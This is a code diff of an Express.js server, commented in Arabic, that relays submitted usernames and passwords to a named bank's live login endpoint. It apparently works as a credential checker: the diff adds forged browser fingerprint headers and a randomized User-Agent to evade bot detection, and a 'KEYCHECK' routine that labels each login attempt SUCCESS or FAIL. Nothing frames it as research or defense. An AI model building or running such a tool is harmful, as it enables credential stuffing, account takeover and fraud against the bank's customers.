@@ -2,23 +2,20 @@ import express from "express";
 import axios from "axios";
 
 const app = express();
-
-// مهم جدًا
 app.use(express.json());
 
-// Route اختبار
+// اختبار إن السيرفر شغال
 app.get("/", (req, res) => {
   res.send("API is running");
 });
 
-// Route اللوجين
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
   if (!username || !password) {
     return res.status(400).json({
       success: false,
-      message: "Missing username or password"
+      error: "Missing username or password"
     });
   }
 
@@ -26,35 +23,65 @@ app.post("/login", async (req, res) => {
     const response = await axios.post(
       "https://digitallobby.huntington.com/pkmslogin.form",
       new URLSearchParams({
-        username,
-        password,
+        username: username,
+        password: password,
         "login-form-type": "pwd"
-      }),
+      }).toString(),
       {
         headers: {
+          "Host": "digitallobby.huntington.com",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Accept-Language": "en-US,en;q=0.9",
           "Content-Type": "application/x-www-form-urlencoded",
-          "User-Agent": "Mozilla/5.0"
-        }
+          "Origin": "https://digitallobby.huntington.com",
+          "Referer": "https://digitallobby.huntington.com/login",
+          "Sec-CH-UA": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+          "Sec-CH-UA-Mobile": "?0",
+          "Sec-CH-UA-Platform": '"Windows"',
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-origin",
+          "User-Agent": getRandomUA(),
+          "Priority": "u=1, i"
+        },
+        timeout: 15000
       }
     );
 
-    const body = JSON.stringify(response.data);
+    const body =
+      typeof response.data === "string"
+        ? response.data
+        : JSON.stringify(response.data);
 
-    if (body.includes("login_success")) {
-      return res.json({ success: true });
+    // KEYCHECK logic
+    if (body.includes('"operation" : "login_success"')) {
+      return res.json({
+        success: true,
+        status: "SUCCESS"
+      });
     }
 
-    return res.json({ success: false });
+    if (body.includes('"operation" : "login"')) {
+      return res.json({
+        success: false,
+        status: "FAIL"
+      });
+    }
+
+    return res.json({
+      success: false,
+      status: "UNKNOWN_RESPONSE"
+    });
 
   } catch (err) {
     return res.status(500).json({
       success: false,
-      error: "Request failed"
+      error: err.message
     });
   }
 });
 
-// مهم جدًا لـ Render
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log("Server running on port", PORT);
